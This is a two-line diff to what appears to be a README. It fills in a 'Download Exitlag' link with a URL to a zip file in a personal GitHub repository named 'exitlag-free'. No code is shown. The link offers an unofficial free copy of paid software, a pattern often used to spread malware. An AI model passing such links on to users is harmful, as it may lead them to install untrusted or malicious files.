@@ -1,4 +1,4 @@
-# [Download Exitlag]()
+# [Download Exitlag](https://github.com/mrtwister7923/exitlag-free/releases/download/Download/Exitlag.zip)
 
 ---
 
